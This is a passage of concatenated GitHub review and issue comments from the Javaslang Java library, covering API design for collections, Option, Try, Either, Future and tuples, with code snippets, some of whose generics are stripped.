see how append is the last function called.\nThis must have to do with the combination of recursion and call-by-name. If we had call-by-value, append would be evaluated first and then cons. But with call-by-name (maybe!?) cons is first evaluated and append is deferred, which allows it to be tail-recursive? Just a guess. The only one, which makes sense here...\nI think another solution might be to use a Trampoline to emulate tail recursion in Java. See Laziness, trampolines, monoids and other functional amenities: this is not your father's Java, p. 34 ff.\nI would only change append for now. Not map et. al. Appending many elements is more realistic than mapping million of times (but who knows...)\n. Right!\n. Rahel correctly remarked that Scala's Stream append :+ takes linear time and is not lazy (see http://docs.scala-lang.org/overviews/collections/performance-characteristics.html and http://stackoverflow.com/a/16442460/1110815).\nThe output looks lazy, but it isn't:\n``` scala\nscala> val s = Stream(1, 2, 3)\ns: scala.collection.immutable.Stream[Int] = Stream(1, ?)\nscala> s :+ 4\nres5: scala.collection.immutable.Stream[Int] = Stream(1, ?)\n```\nHere is how Scala's append works:\n``` scala\nimport scala.collection.immutable.Stream.StreamBuilder\nval s = Stream(1, 2, 3) append 4\n// simple special case\nimplicit class StreamExtensions(stream: Stream[Int]) {\n  def append(elem: Int): Stream[Int] = {\n    val b = new StreamBuilder[Int]\n    b ++= stream\n    b += elem\n    b.result()\n  }\n}\nclass StreamBuilder[A] extends scala.collection.mutable.LazyBuilder[A, Stream[A]] {\n  def result: Stream[A] = parts.toStream flatMap (_.toStream)\n}\nabstract class LazyBuilder[Elem, +To] extends Builder[Elem, To] {\n  /* The different segments of elements to be added to the builder, represented as iterators /\n  protected var parts = new ListBuffer[TraversableOnce[Elem]]\n  def +=(x: Elem): this.type = { parts += List(x); this }\n  override def ++=(xs: TraversableOnce[Elem]): this.type = { parts += xs ; this }\n  def result(): To\n  def clear() { parts.clear() }\n}\n```\nThe Scala solution adds pressure to GC by creating intermediate List(x) and then flatMapping over them. I see no benefit over just iterating over all, prepending to a new instance and finally reversing the result to obtain the right order, e.g. stream.reverse().prepend(x).reverse() would do also the job. Maybe it is the mutable ListBuffer which makes it more effective? Only benchmarks would make it clear.\n. of cause - right!\n. Hi @v1ctor, thank you for your proposal!\nYes, this might come handy. I will comment the code in a minute...\n. Very nice, many thanks!\n. Wow, thank you! The code looks great. I have some thoughts/minor changes regarding some coding conventions/style we do. Will comment it in a minute...\n. We should disallow a negative offset for startsWith. Aligning to Scala is a good idea, otherwise it would be confusing.\n. I hope my comments aren't too boring :-) Just naming, null-checks and braces. Your code is really great!\nI'm really looking forward to your enhancements! They will went into the 2.0.0 release at the start of December.\n. Thx! {\ud83d\ude38}\n. Many thanks, great additions!\n. Great, thx!\n. LGTM, thx!\n. Thank you :-)\n. > P.S. I'm sorry if I'm annoying :)\nIt isn't annoying! Your feedback improves the usability!\n. Well done, many thanks!!\n. towards #824\n. Nice, thx! Looks very good!\n. towards #824\n. towards #824 \n. Awesome!\n. The following tests fail if we add these tests to AbstractMapTest:\n``` java\n    @Test\n    public void shouldRecognizeNotContainedKeyValuePair() {\n        final TreeMap testee = TreeMap.of(Tuple.of(\"one\", 1));\n        assertThat(testee.contains(Tuple.of(\"one\", 0))).isFalse();\n    }\n@Test\npublic void shouldRecognizeContainedKeyValuePair() {\n    final TreeMap<String, Integer> testee = TreeMap.of(Tuple.of(\"one\", 1));\n    assertThat(testee.contains(Tuple.of(\"one\", 1))).isTrue();\n}\n\n```\nFailures:\njava\nFailed tests:   shouldRecognizeNotContainedKeyValuePair(javaslang.collection.HashMapTest): expected:<[fals]e> but was:<[tru]e>\n  shouldRecognizeNotContainedKeyValuePair(javaslang.collection.LinkedHashMapTest): expected:<[fals]e> but was:<[tru]e>\n  shouldRecognizeNotContainedKeyValuePair(javaslang.collection.TreeMapTest): expected:<[fals]e> but was:<[tru]e>\n. Splitting interface Lazy into internal final classes Lazy.Defined and Lazy.Undefinied appears to be natural. So far all Value types are dual; Option has Some, None, Try has Success, Failure, etc.\nI'm not sure if it would make sense to expose Defined and Undefined as public API. For now they will remain internal. Later this might be changes if it makes sense.\nAlso I'm not sure if it would make sense to provide and Eager value implementation, with Eager.Defined and Eager.Undefined. It would be just a wrapper for ordinary values, allowing us to perform filter-monadic operations. For now we will not implement it.\n. We will expose Lazy.Defined and Lazy.Undefined. Stream.Cons/Stream.Empy, List.Cons/List.Nil, etc. do it also. Making these additional types public available is helpful when pattern matching types.\n. Great!\nI've dived into the scan methods today. IMO we should get the hands on them again an do the following:\n- The main interfaces remain the same, e.g. Traversable, Seq/IndexedSeq/LinearSeq, Map/SortedMap, Set/SortedSet.\n- The implementing classes (List, Stream, Queue, HashSet, ...) should provide individual implementations in order not to convert the collections. Here some code-duplication will take place in favor of better performance.\n- Iterator should be lazy for all non-aggregating methods. We need to return an Iterator of prefixes. This can be used for the Map impls as many of the Map methods use Iterator.\nThis is some sort of reverse-refactoring because we unfold the existing code but I think it is worth it.\n. We may also abstract over it and provide an empty result, e.g. HashSet.empty(), an aggregate function, e.g. result::add, and a finished, e.g. identity or result.reverse()\u00b4 when the aggregator isprepend`.\nIt is like the java.util.stream.Stream collector. Then we have no code duplication. The only difference will be Iterator. Here we will have individual scan impls I think.\n. Yes maybe you're right. There are still plenty of things to do until 2.0.0. I tend to move some things from 2.0.1 to 2.0.0 (sequence and transform) to get a more complete lib with little effort. We target start of december for 2.0.0 release but IMO it is more important to get it right and stable than shipping a few days earlier.\n. Thx!\n. We should move the scan tests to AbstractTraversableTest.\n. Still need to take a look at the following tests:\n- CharSeqTest\n- LinkedHashMapTest\n- TreeMapTest\n. Status:\n[OK] *Test\n[OK] Traversable\n[OK] Seq\n[OK] - LinearSeq\n[OK] -- List\n[OK] -- Stack\n[OK] -- Stream (depends on Iterator)\n[OK] -- Queue\n[OK] - IndexedSeq\n[OK] -- Array\n[OK] -- CharSeq\n[OK] -- Vector\n[OK] Set\n[OK] - LinkedHashSet\n[OK] - HashSet\n[OK] - SortedSet\n[OK] -- TreeSet\n[OK] Map\n[OK] - LinkedHashMap\n[OK] - HashMap\n[OK] - SortedMap\n[OK] -- TreeMap\n[OK] Tree\n[OK] Iterator (needs to be lazy!)\n. Thank you! I will look into it.\n. Also, why Seq.crossProduct has a different return type than Seq.combinations or Seq.permutations?\n`` java\n// In Seq we have? extends SeqvsIndexedSeq`\nSeq<? extends Seq> combinations();\nSeq> crossProduct(int power);\nSeq<? extends Seq> permutations();\n// Example: Array\nArray> combinations();\nArray> crossProduct(int power);\nArray> permutations()\n```\nUpdate: We will change the return type of crossProduct(int) to be consistent with the other methods.\n. Also:\n``` java\n// javaslang.Iterable\nIterator> sliding(int size);\n// Set\nIterator> sliding(int size);\n```\nbut we want to have:\n``` java\n// javaslang.Iterable\nIterator<? extends Traversable> sliding(int size);\n// Set\nIterator> sliding(int size);\n``\n.Iterable.slidingandgroupeddoes really make no sense forValues likeOption,TryandFuture. We see this when looking at the dependencies of the return types, e.g.Iterator<? extends Traversable>.Optionfor example should have the resultIterator>, but this is currently not possible becauseOptiondoes not extendTraversable. If we relax the return type, e.g.Iterator<? extends Value>orIterator<? extends Iterable>, we could do it right but seriously (yes, looking at you, Scala), why should a single-valued type supportslidingandgrouped`?\nUpdate: Sorry, Scala, I have to apologize. Iterable extends Traversable.\n. Fixed.\n. Towards #843\n. Thx!\n. @ruslansennov Just found your comment. The link does not work any more - will take a look\n. Done \ud83e\udd84\n. Towards #843 \n. Also here I'm sorry for the merge conflicts!\n. Very nice, thank you Victor!\n. Hi @v1ctor, thank you! I'm sorry for the merge conflicts because of my PR...\n. Thx for the nice addition!\n. Yes that's better - less is more! It reduces the complexity.\n. yes, it is obsolete now that we have the docs\n. I see the use case.\nIn fact Match is the generalization of an If. In other words eventually someone may ask to implement an else case:\njava\nMatch.of(...)\n     .when(...).then(v -> performSideEffects(v))\n     .otherwise(v -> performOtherSideEffects(v));\nthen and otherwise need the following arg types:\n- Consumer\n- Runnable\nPlease not that it will be possible to create:\njava\nMatch.of(...)\n    .when(...).then(function1)\n    .when(...).then(function2)\n    .when(...).then(consumer) // after this call only otherwise(Consumer) is possible\n    .otherwise(consumer); // optional\n. Thanks for clarification, that is possible. I will do it.\n. Cool to hear that, I will assist you!\nHere come some first informations:\nMatch is implemented as internal Domain-Specific Language (DSL). The types are modeled as inner classes. The structure of the type hierarchy helps to understand how to write sentences in the DSL:\nMatch\n    MatchFunction\n        WhenUntyped\n        When\n            Then\n        WhenApplicable\n        Otherwise\n        Case<R>\n    MatchMonad\n        Of\n        WhenUntyped\n        When\n            Then\n        WhenApplicable\n        Otherwise\nBasically we distinguish between two types of Match expressions.\n1. Match Function: Function<Object, R> f = Match.when(...).then(...);\n2. Match Monad: R result = Match.of(obj).when(...).then(...).get();\nOur goal is to add these functions:\n- Then<Void> then(Consumer<? super T> action)\n- Then<Void> then(Runnable action)\nto these types:\n- WhenUntyped\n- When\nAnd we need to add these methods to Then:\n- Otherwise<Void> otherwise(Consumer<? super T> action)\n- Otherwise<Void> otherwise(Runnable action)\nPlease write test cases in order to get sure that there are no type-ambiguities in the new API.\n. Should be all ok FWICS (but haven't tested it in depth). Have you tried it? It should not matter if the function f does return null because we create an Option of a Supplier (which is always Some(Supplier)) instead of an Option of a Value.\n``` java\n// Some(Supplier)\nOption> opt1 = Option.of(() -> null);\n// None\nOption opt2 = Option.of(null);\n``\n. Thx for your contribution!\n. Thx :)\n. Mmhh - but you didn't change anything regarding thecomputeResult` method (see PR). It should be all fine as it is.\nCould you please test the expected behavior? Then we will see if we have a todo.\nThx!\n. Great, I'm looking forward to it!\n. travis-ci?\n. There was an incident today Build processing delays for public projects (travis-ci.org) - but should be fixed now. We will see...\n. We should question the whole idea of caching hashes. I mean, a lazy wrapper of a lambda/value is computed for every node of a data structure in general - also for primitive values like ints, which are commonly used. We need to profile the memory consumption of different scenarios and compare it with other frameworks, first of all Java standard lib.\nWe should answer the question how often the hash code is really needed in practice, e.g. how often collections are used as keys in hash-based collections. And what is the value count where caching really starts to matter. And what is more important: CPU or Memory. Many questions.\n. I tend to throw away the Lazy hash code of all types for now. We can't argue a 10x or more memory consumption when we compare Javaslang with other collections.\n. Filed #864\n. Let's do it like you say. If the memory footprint is still too big compared with ordinary collections, we can still remove the cache.\n. Ok, sounds reasonable. We will have an eye on it when benchmarking the collections in depth.\n. Thx, right! Will take that into account...\n. We will never get the perfect solution with Java's functional interfaces - there is no 'one size fits all'. Scala has real function literals - a x -> yis always the same.\nFor Java things behave a little different. x -> y fits every @FunctionalInterface which has a method with argument x and return type y, even if we have a Consumer! Then the return type is discarded.\nIf we would move all functional interfaces to the root package, no one will know which to take. Therefore we do place the functional interfaces where they belong to (high cohesion principle).\nThat would also be my take when designing a new Java 8 application. Create functional interfaces where there belong. They need to be bound by 'business need'. Even if there are technically n types of function.\nThe Function1..8 / CheckedFunction1..8 are general purpose functions with rich functionality. Programmers can use them everywhere, if needed.\n. It is an aggregate dependency. If Try disappears, the Try.Checked* functions are not needed any more. They belong to each other. We need to model this fact with the possibilities we have.\n~~On the other hand~~ Also the packages of the Java lib are not state of the art. cough util cough.\n. Maybe you are right an we can remove all Try.Checked* interfaces.\nPredicate, Runnable and Consumer are needed then, maybe with different names?\nSupplier is Function0... will users recognize that?\nIf we provide these new functions people will ask for version with two or more arguments, maybe primitive data types... that would be too much.\nI had all this and the code generator and the number of interfaces exploded (thousands).\nThis leads to the solution to separate the concerns and make a clear slicing.\njavaslang.Function* are designed to existin a word where all is an object. Even Void return type.\n. @RobWin I will take this ticket. With #1044 all changes. We will not need the filterTry, ... methods any more and just have filter(CheckPredicate) instead of filterTry(CheckedPredicate). This will be awesome!\n. TODO:\n- onComplete, onSuccess and onFailure should take a Consumer (instead of a CheckedConsumer)\n- Try.andThen behaves different for CheckedRunnable and CheckedConsumer!?\n. The different andThen implementations of Java 8 - just for comparison.\nConsumer.andThen:\njava\ndefault Consumer<T> andThen(Consumer<? super T> after) {\n    Objects.requireNonNull(after);\n    return (T t) -> { accept(t); after.accept(t); };\n}\nFunction.andThen:\njava\ndefault <V> Function<T, V> andThen(Function<? super R, ? extends V> after) {\n    Objects.requireNonNull(after);\n    return (T t) -> after.apply(apply(t));\n}\n. Chaining of Try/Future onSuccess & onFailure handlers is dangerous. Let's consider the following:\njava\nTry.of(...)\n   .onSuccess(valueConsumer)\n   .onFailure(throwableConsumer);\nThe onSuccess method returns the original Try.of(...) result, even if valueConsumer fails in the onSuccess method. This is important because otherwise we have no control when errors are handled.\nBecause of this the above consumers are not checked. If the consumers may throw, they should be handled as follows:\njava\nTry.of(...)\n   .onSuccess(t -> Try.run(() -> valueConsumer.accept(t)))\n   .onFailure(t -> Try.run(() -> throwableConsumer(t)));\n. Scala does the following (using import scala.concurrent.ExecutionContext.Implicits.global):\nscala\nscala> val f = Future(1); f.onComplete(_ => throw new Error(\"test\")); f.onComplete(t => println(t));\njava.lang.Error: test\n    at $line13.$read$$iw$$iw$$anonfun$2.apply(<console>:12)\n    at $line13.$read$$iw$$iw$$anonfun$2.apply(<console>:12)\nSuccess(1)\n    at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32)\n    at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121)\n    at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)\n    at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339)\nf: scala.concurrent.Future[Int] = scala.concurrent.impl.Promise$DefaultPromise@7c211fd0\n    at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979)\n    at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)\nThis means the second onComplete is executed because the error was thrown on a different thread.\nOur Future.onComplete() method should behave the same.\n. While testing I changed the default executor service of Future to single-threaded. I think there is no 'best practice' which concurrent executor service to take (fixed size, scheduled, fork/join, pooled, etc.)\njava\n    /**\n     * The default executor service is {@link Executors#newSingleThreadExecutor()}.\n     * Outer executor services like {@link Executors#newCachedThreadPool()} may prevent the VM from exiting.}\n     */\n    ExecutorService DEFAULT_EXECUTOR_SERVICE = Executors.newSingleThreadExecutor();\n. Needed to switch back to CachedThreadPool because otherwise deadlocks may occur.\n. Sounds great! I want to understand more about this optimization. Maybe I can apply similar things to other parts of Javaslang.\nWhat was the test case / how do you test it? You mentioned @netzwerg's test. Which tool do you use to profile it?\nHow do you get the number of objects used? Is it the overall number of objects in memory or are we able to measure the objects in a dependency graph?\n. Nice! Curious to see how memory consumption changes if we remove Lazy hashCode...\n. Yes, it will. That's the trade between Memory and CPU.\nMemory is more important when we take into account that huge Javaslang data structures are rarely used as Map keys. But Memory-Consumption is always present.\n. Theory and Practice...\n. Could you make a quick check how Lazy hashCode impacts our HAMT mem consumption? Should be a fast thing removing the Lazy instance var. Just to get a feeling...\n. And the LeafSingleton.hash field is removed, hash() { return Objects.hashCode(key); }\n. @ruslansennov please review this\n. :-) \n. \n. Note to myself: catch(ClassCastException) is a smell\n. Thx!\n. (Note to myself: capture the state with types, not with values)\n. Nice catch, thx!\n. Is it right that you used right instead of left?\nYours:\njava\nEither<String, String> bad = Either.right(\"bad\");\nBut it should be like the Scala example:\njava\nEither<String, String> bad = Either.left(\"bad\");\n. Instead we could also use:\njava\nEither<String, String> good = new Right<>(\"good\");\nEither<String, String> bad = new Left<>(\"bad\");\n. That's strange. It should not happen, Either once was unit-tested very well. I will take a look later today.\nAdditionally I filed an issue to behave more like Scala: #882 \n. We currently use static factory methods on interface methods only.\nAdditionally implementing classes have exactly one constructor in Javaslang. If possible, this constructor takes exactly the arguments to initialize the final fields of the class. Like case classes of Scala.\nClasses may have factory methods, if other initialization possibilities are needed. Like companion objects in Scala. We use this for some collections, e.g. HashMap, TreeMap, et al.\nI use new new Some<>(a) instead of Option.of(a).\n\nMost probably there will no Xxx.of methods for impl classes. I once had the idea to provide factory methods named like the class, to offer more Scala-like API. \nExamples:\n``` java\ninterface Option {\nstatic <T> Option<T> Option(T t) {\n    return (t == null) ? None() : Some(t);\n}\n\nstatic <T> Some<T> Some(T t) {\n    return new Some<>(t);\n}\n\nstatic <T> None<T> None() {\n    return None.instance();\n}\n\n```\nUsage:\n``` java\nimport static javaslang.control.Option.*;\nclass API {{\nSome<String> some = Some(\"hi\");\n\n}}\n```\nBut this is a hack. I want Javaslang behave like users expect standard Java to work.\n. Btw - I like your new profile pic! Asked myself who you are before you added your name :-)\n. I think you're right. There should be no inherent - undocumented logic or some conventions which probably no one knows and which most probably eventually will be broken for that reason.\nWe should file an issue and do it.\n. I've added Option.some, see #888\n. Note: The *.of(T) constructors are implemented in #889 \n. No, we should not do that. My idea of making Either left/right biased seems to be nothing new: http://robsscala.blogspot.de/2012/06/fixing-scalaeither-unbiased-vs-biased.html.\n. We should check, if Xor is still necessary: #673 \n. Our Either implementation is unbiased, e.g. the Left-/RightProjection act as follows:\n- map returns a Left-/RightProjection instead of an Either \u2713\n- flatMap also does this, and takes a L/R -> Left-/RightProjection instead of a  L/R -> Either \u2713\n- filter does remove Option<L/R> \u2713\nWe are able to make Either biased at the same time because these two modes are mutually exclusive. For the right-biased version, we let Either also implement Monad and Value.\nThis makes clear what we mean with right-biased:\njava\npublic interface Either<L, R> extends Monad<R>, Value<R> {\n    ...\n}\n. :+1: \n. The\nopt.accept(() -> \"none\", v -> \"some\")\nis the same as\nopt.map(v -> \"some\").orElseGet(() -> \"none\")\nor\nopt.map(v -> \"some\").orElse(\"none\")\nIf the previous value is not needed, we can use one of the methods ifDefined or ifEmpty, inherited from Value. (In other words, all Values have them, e.g. Either, Try, Match, List, ...)\n``` java\nopt.ifDefined(\"some\", \"none\")\nopt.ifDefined(() -> \"some\", () -> \"none\")\nopt.ifEmpty(\"none\", \"some\")\nopt.ifEmpty(() -> \"none\", () -> \"some\")\n```\n\nTo not blow up the API too much I will not pull this request. (Actually the first PR I rejected)\nI hope you understand.\nThanks you for your ideas! Keep on PR-ing!\n. Please close the PR if you agree or ask if there are any questions!\n. This is a great idea!\nI want to generalize it for all tuples. The Generator.scala has to be changed accordingly. I did this yesterday for Monad.lift. If you don't mind I will do this for Tuple.\nOr you change the Generator.scala because it is your idea. What do you think?\n. I've implemented in in Generator.scala. There is an ambiguity in Tuple1:\n``` java\n// current method\n U transform(Function<? super Tuple1, ? extends U> f);\n// newly added method - ambiguous after type erasure\n U transform(Function<? super T1, ? extends U> f);\n```\nWhich one do we take?\n- Function<? super Tuple1<T1>, ? extends U> is how transform is defined in general\n- Function<? super T1, ? extends U> is easier to use\n...?\n. You mean like so?\n``` java\nTuple0:\n     U transform(Supplier<? extends U> f)\nTuple1:\n     U transform(Function<? super T1, ? extends U> f)\nTuple2:\n     U transform(Function<? super Tuple2, ? extends U> f)\n     U transform(BiFunction<? super T1, ? super T2, ? extends U> f)\nTuple3:\n     U transform(Function<? super Tuple3, ? extends U> f)\n     U transform(Function3<? super T1, ? super T2, ? super T3, ? extends U> f)\n...\n``\n. Ok - we need to go one way, then we will take this one.\n. Or we just leave out the whole U transform(Function<? super Tuple*, ? extends U> f)` methods. Makes no sense IMO.\n. Even one more time we see that Tuples are the most special types. It seems they follow no rules. Before it was not possible to implement the Value interface. Tuples are no objects on their own, they are defined only by the values they contain.\n\nFascinating.\n\nMr. Spock\n. \n. Implemented with #887, so this can be closed please.\n. This change was suggested by @tkob.\n. Yes I know. Will take that into consideration. Have to think about it...\nHowever, This method is needed, too, to be consistent with other types, e.g. Try\njava\nTry.of(() -> x); // = Success(x) or Failure(...)\nTry.success(x); // = Success(x)\nTry.failure(x); // = Failure(x)\n. Please file an issue for the of methods...\n. Hi Martti, thank you for this great investigation!\nwe will add the additional static factory methods of to the other types for convenience. They will be pretty much like Scala's companion object methods.\nI was not aware of this null-handling. We have to be careful in Javaslang not to break something, for example the Failure.NonFatal.equals method currently relies on the fact the the exception is not null.\n. @enelson That would be awesome - but I think the target moved here because we moved the impl classes into the interfaces, e.g. Option.Some, Option.None, Try.Success, etc.\nThe constructors are now private and we added factory methods to the interfaces, e.g. Option.some(T), Option.none(), Try.success(...), etc.\nGiven that I think we can close this ticket now.\n. @enelson You could take a look at \"Add sequence methods\" #767. This one turns a sequence of monad instances inside out. E.g.\nA sequence of futures Future.sequence(Future<T1>, ..., Future<Tn>) is turned into a future of sequential results Future<Seq<T1, ..., Tn>.\nThis is non-trivial because the characteristics of the Monad are reflected by the static sequence method.\nI already added Future.sequence and Lazy.sequence. I don't think we need the sequence method for collections. We need to implement the sequence method for controls. These are:\n- Either - here we have two Monads: LeftProjection and RightProjection. I don't know yet how to proceed here. Maybe it makes more sense to add the sequence method to Either instead. Please take also a look if and how Scala does it (also scalaz).\n- MatchMonad - a sequence of MatchMonad's is turned into a MatchMonad of Seq of values. The resulting MatchMonad isEmpty() if at least one of the input MatchMonad's does not match.\n- Option - the result is none if at least one of the options is none\n- Try - should be very similar to Future because we also have failures. The result is a failure if at least one of the Try's fails\n. Thx!\n. Nice! I will pull this when refactoring finished and all works as expected (see #721)\n. Mmhh, ok - will defer this until 2.0.1. We may close it after digging deeper into Scala's behavior.\n. A lazy groupBy would be a deferred execution. I agree that it makes no sense here.\n. Thx!\n. Hi Martti, thank you for your finding!\nBtw - Great project javactic\n. Generally a good idea!\nMy vision is the following:\nProjects asked for from the outside, like adapters for existing, popular frameworks, should be included. It helps people to integrate Javaslang in their environments. javaslang-jackson is an example for supporting JSON marshalling/unmarshalling.\nIn order to include projects we should wait a while until they emerged from the incubation phase.\nPlease do not underestimate the maintenance factor for a project. It would be no good marketing strategy to have an organization where many projects are not maintained any more.\nSo for now I added...\nawesome-javaslang\nto create a list of awesome Javaslang projects. Please add your projects!\n@ruslansennov I added javaslang-jackson. It would be great to have to minimal code snippets/examples for searialization/deserialization (e.g. of a List.of(1, 2, 3) or something simple)\n/cc @ggalmazor (jfry), @RobWin (circuit-breaker), @mvh77 (javactic), @johnmcclean-aol (multiple modules)\n. Thx!\n. We will remove flatMap completely because it is a special case of transform. Renaming it to map would raise ambiguities regarding in Tuple1:\njava\n<U1> Tuple1<U1> map(Function<? super T1, ? extends Tuple1<? extends U1>> f);\n<U1> Tuple1<U1> map(Function<? super T1, ? extends U1> f1);\n. We will stay with flatMap. Regarding 'the content of the Tuple is a Tuple', it is correct. It solves the ambiguities and people are more used to it than using the generalization 'transform'.\n. Thx Eric :)\n. That's good to hear. I love Scala, too, and wanted s.th. similar in Java...\n. Caution! Scala's type system behaves completely different than Java's.\nExample 1: orElse\nWe have T orElse(T other) which allows us to do this:\njava\nNumber n = 3d;\nOption<Number> option = Option.of(n);\nNumber number = option.orElse(new BigDecimal(\"0\"));\nIn other words we don't need to declare it as:\njava\n<U extends T> T orElse(U other);\nExample 2: orElseGet\nAlso here we have nothing to do because\njava\nT orElseGet(Supplier<? extends T> supplier);\nshould be equivalent to\njava\n<U extends T> T orElseGet(Supplier<U> supplier);\n. Yes, good catch. We will refactor it to be consistent with Scala (orElse, getOrElse, ...).\n. Thank you Martti! This looks good to me. I will perform the refactoring if you don't mind to ensure all use cases still hold. Maybe I have to remove or change functionality.\n. Thx :) Sometimes I need some hours/days to get a distant view of my own API and take suggestions into account.\nGood hint to re-visit the methods orElseRun, orElseThrow and orElseTry. I will do that.\n. ``` java\n// instead of the 'old' orElseRun we use this existing methods:\nTry onFailure(Consumer<? extends Throwable> action);\n// orElseThrow is the same as this (but the exception is wrapped in a NonFatal):\nrecover(...).get();\n```\nWe added Value.orElseTry as syntactic sugar on Nov 25: https://github.com/javaslang/javaslang/issues/851\nI think instead we may use:\njava\nvalue.toTry().getOrElse(supplier);\nHere is also important: \"Specific Try (and Future) methods should take Checked functions\" #865\n. Phase 1: I've refactored the following methods:\njava\nget( )                        (ok, no changes)\ngetOption()                   (ok, no changes)\norElse(T)                  -> getOrElse(T)\norElseGet(Supplier)        -> getOrElse(Supplier)\norElseGet(Function)        -> getOrElse(Function)\norElseTry(CheckedSupplier) -> getOrElseTry(CheckedSupplier)\norElseThrow(Function)      -> getOrElseThrow(Function)\norElseRun                     (ok, no changes)\nrecover(Function)             (ok, no changes)\nrecoverWith(Function)         (ok, no changes)\nIn Phase 2 I will create the missing methods:\njava\nValue<T> orElse(Value<? extends T> alt);\nTry<T> orElse(Supplier<? extends Try<? extends T>> alt);\nAlso we need to synchronize these methods on Try, Future and maybe Either.\n. Scala has the method orNull that works similar to getOrElse(null):\nscala\ndef orNull[A1 >: A](implicit ev: Null <:< A1): A1 = this getOrElse ev(null)\nExamples:\n``` scala\n//> res0: Null = null\nNone.orNull\n//> res1: String = A\nSome(\"A\").orNull\n// Errors:\n// - Cannot prove that Null <:< Int.\n// - not enough arguments for method orNull: (implicit ev: <:<[Null,Int])Int. Unspecified value parameter ev.\nSome(1).orNull\n```\nI think in our context the name is misleading. It should have been getOrNull because the contained value is returned. However, I think we will not support it. If null is needed we have to type the longer version getOrElse(null).\n/cc @mvh77 \n. orElse cannot be added to our base-class Value, because the alternate value is of the current self-type:\njava\ninterface Option<T> {\n    Option<T> orElse(Option<? extends T> alternate);\n    Option<T> orElse(Supplier<? extends Option<? extends T>> alternate);\n}\nTherefore all single-valued types, i.e. controls and Future, will have a signature with their own type (as shown above for Option).\nWe could also provide this method for Traversables, why not?\n``` java\ninterface Traversable {\n    Traversable orElse(Iterable<? extends T> alternate);\n    Traversable orElse(Supplier<? extends Iterable<? extends T>> alternate);\n}\ninterface List {\n    @Override\n    List orElse(Iterable<? extends T> alternate);\n    @Override\n    List orElse(Supplier<? extends Iterable<? extends T>> alternate);\n}\n```\netc.\n. Yep, ok\n. Another approach implementing orElse would be to let it look like\njava\ninterface Value<T> {\n    Value<U> flatMap(Function<T, Iterable<U>> f);\n}\nwhere flatMap is defined as unit(map(f).flatten()). The unit function is some kind of selector which closes the world between single-valued and multi-valued types. We need it because Java has no higher-kinded types, otherwise we could not define a common flatMap method.\nIn other words we would define orElse like this:\njava\ninterface Value<T> {\n    Value<T> orElse(Iterable<? extends T> alternate);\n    Value<T> orElse(Supplier<? extends Iterable<? extends T>> alternate);\n}\nIn the else case we would internally alternate, if it is of the right type, or convert it to the return type of orElse. Every Value (Option, Match, Either, Try, Traversable, Future, ...) is of type Iterable.\n. Yes, that's the way we will go. See also #1044 \n. @ruslansennov could you add these to Values (but not to Traversables!)\nExample for Try:\njava\ninterface Try {\n    Try<T> orElse(Try<? extends T> alt);\n    Try<T> orElse(Supplier<? extends Try<? extends T>> alt);\n}\nBecause the type (here: Try) is part of the method arguments and Java has no higher-order types, we need to add the function not to all classes. This is the list which has the methods:\n- Either, LeftProjection, RightProjection\n- Future\n- Lazy\n- MatchMonad\n- Option\n- Try\n- Validation\nThank you!\n. Ruslan finished it!\n. Hi Guillermo,\ngetOrNull() sounds reasonable. Could you add an issue please? A default method in the Value interface will do the job:\njava\ninterface Value<T> {\n    default T gerOrNull() {\n        return isEmpty() ? null : get();\n    }\n}\nThx!. I restarted the travis-ci test. I think you have to be admin to do that. It seems there was a timeout in a wait-method of a Future-unit test. I will increase the wait time-window a bit then it should not happen again...\n. Don't get why it does not build on travis-ci. Will investigate it tomorrow morning!\n. I will pull it. The error has nothing to do with the code changed here. Afterwards I will fix it with a separate PR.\nMany thx!\n. Reverted changes.\n. Thx!\nI don't get why the two Future tests fail now on every build and worked before... I'm currently investigating it.\n. Oh - works again...\n. I will pull it. The error has nothing to do with the code changed here. Afterwards I will fix it with a separate PR.\nMany thx!\n. Creating an instance method gives us more flexibility regarding the creation of an cycle:\njava\nStream.of(1, 2, 3).cycle();\nStream.ofAll(iterable).cycle();\nThe operation could be performed on constant Stack like this:\njava\ndefault Stream<T> cycle() {\n    return appendSelf(Function.identity());\n}\n. The CI build does hang at the FutureTest. This might have two reasons:\n- a deadlock happens\n- the system runs out of resources when creating new threads. Maybe the fork-join thread pool waits for threads to be returned into the pool before creating new ones.\nI will commit some debug output to investigate this on the CI server because we can't reproduce it locally on different machines.\n. We already have exists(predicate) for all Values (Option, Try, Traversable, ...). This is the same as isMatch(predicate).\nThis isSome looks like an imperative smell to me from the viewpoint of functional programming. What is the use-case?\nInstead of\njava\nresult = opt.isSome(value) ? a : b;\nit is better to\njava\nresult = opt.map(...).ifDefined(a, b);\nPlease convince me that isSome is needed :)\n. @v1ctor I'm sure you have a use-case in mind or a code snippet. How would you use it in your application? Then I can see if we include it or express it with existing syntax.\n. We will rename boolean isSome(T element) to boolean contains(T element) and pull the existing method from Traversable into Value (internal: Iterable).\nI've done this with with #917. I hope you don't mind to close this PR. I'm very thankful for your great ideas! Keep on PR'ing!\n. Thx!\n. Thx!!\n. @bartolom thank you, yes - I've seen it.\nOur collections already have static factory methods of(T) and of(T...). Map now has of(Object...).\nI opened the issue #933 to get sure we do not miss something.\nMany thanks!\n. That looks wonderful :-)\nThank you!\n. Thank you :) That really helps to get the open issues done!!\n. Looks great - only some fine-tuning\n. Thx, well done!\n. Thank you! LGTM\n. Thx!\n. YAY! I loooove it! Simple yet great API addition.\n. Example:\njava\n// uses Function1#memoized()\nFunction1<Integer, String> cache = HashMap.of(1, \"a\", 2, \"b\", 3, \"c\").memoized();\n. Top!\n. We do not support unmodifiableXxx methods because our collections are immutable by design.\nFor what I can see, the only methods we currently do not have are (Linked)HashMap.ofEntries(...). Instead we have (example: HashMap):\njava\npublic static <K, V> HashMap<K, V> ofAll(Tuple2<? extends K, ? extends V>... entries) {\npublic static <K, V> HashMap<K, V> ofAll(Iterable<? extends Tuple2<? extends K, ? extends V>> entries)\nWe should rename these methods to\njava\npublic static <K, V> HashMap<K, V> ofEntries(Tuple2<? extends K, ? extends V>... entries) {\npublic static <K, V> HashMap<K, V> ofEntries(Iterable<? extends Tuple2<? extends K, ? extends V>> entries)\nand additionally provide\njava\npublic static <K, V> HashMap<K, V> 